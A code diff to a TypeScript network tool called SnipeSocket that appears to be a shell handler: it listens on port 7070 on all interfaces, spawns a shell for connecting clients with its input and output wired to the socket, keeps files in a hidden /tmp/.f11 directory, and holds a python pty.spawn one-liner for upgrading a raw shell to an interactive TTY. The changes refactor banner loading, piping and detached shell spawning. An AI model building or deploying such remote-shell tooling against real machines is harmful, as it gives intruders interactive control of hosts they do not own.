@@ -14,8 +14,8 @@ const TMP_DIR = `/tmp/.f11`;
 const CMD_PASS = ['ls', 'cat', 'pwd', 'whoami', 'cd', 'curl', 'wget'];
 
 // Constants
+let PROMPT = colors.blue('snipe>') + colors.reset(' ');
 const NEWLINE = `\r\n`;
-const PROMPT = colors.blue('snipe>') + colors.reset(' ');
 const PORT = 7070;
 const HOST = '0.0.0.0';
 const STABALIZE = `python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null`;
@@ -80,7 +80,7 @@ class SnipeSocket {
   constructor (socket: net.Socket) {
     this.sock = socket;
 
-    fs.mkdirSync(TMP_DIR, { recursive: true });
+    if (!fs.existsSync(TMP_DIR)) fs.mkdirSync(TMP_DIR, { recursive: true });
   }
 
   public get sig(): string {
@@ -115,21 +115,38 @@ class SnipeSocket {
     cp.stdout.on('data', this.sock.write.bind(this.sock));
     cp.stderr.on('data', this.sock.write.bind(this.sock));
 
-    cp.on('close', (code) => {
-      msg('debug', `[downrun] Child process exited with code ${code}`);
-      this.inShell = false;
+    // cp.on('close', (code) => {
+    //   msg('debug', `[downrun] Child process exited with code ${code}`);
+    //   this.inShell = false;
 
-      if (cb) cb(code);
-    });
+    //   if (cb) cb(code);
+    // });
   }
 
   public prompt(): void {
     this.sock.write(`${NEWLINE}${PROMPT}`);
   }
 
-  public welcome(): void {
-    require("nexeres").get("msgs/welcome.txt");
-    // if (fs.existsSync('msgs/welcome.txt')) this.sock.write(colors.blue(fs.readFileSync('msgs/welcome.txt').toString()));
+  public welcome(isNexe = false): void {
+    let banner = 'msgs/welcome.txt';
+    let body = 'Welcome to SnipeSocket!';
+
+    try {
+      if (isNexe) {
+        body = colors.blue(require('nexeres').get(banner));
+        body += colors.blue(require('nexeres').get('msgs/derp-60.txt'));
+      } else if (fs.existsSync(banner)) {
+        body = colors.blue(fs.readFileSync(banner).toString());
+      } else {
+        body = `[fallback] ${body}`
+      }
+    } catch (err) {
+      msg('warn', `Caught error reading msg text files, falling back`);
+      console.log(err);
+      this.sock.write('Welcome!');
+    }
+
+    this.sock.write(body);
 
     this.prompt();
   }
@@ -137,10 +154,14 @@ class SnipeSocket {
   public spawn (cmd: string, args?: string[], stable?: boolean, opts?: any, cb?: (code: number | null) => void) {
     this.inSpawn = true;
     const cp = spawn(cmd, args, opts);
+    this.sock.on('data', cp.stdin.write.bind(cp.stdin));
+    cp.stdout.on('data', this.sock.write.bind(this.sock));
+    cp.stderr.on('data', this.sock.write.bind(this.sock));
+
     if (stable) cp.stdin.write(`${STABALIZE}${NEWLINE}`);
-    this.sock.pipe(cp.stdin);
-    cp.stdout.pipe(this.sock);
-    cp.stderr.pipe(this.sock);
+    // this.sock.pipe(cp.stdin);
+    // cp.stdout.pipe(this.sock);
+    // cp.stderr.pipe(this.sock);
 
     // What about no out?? on enter?
     cp.on('close', (code) => {
@@ -153,7 +174,7 @@ class SnipeSocket {
 
   public shell() {
     this.inShell = true;
-    this.spawn(findShell(), [], true, {},  (code) => {
+    this.spawn(findShell(), [], true, { shell: true, detached: true },  (code) => {
       msg('info', `[shell] Child process exited with code ${code}`);
       this.inShell = false;
     });
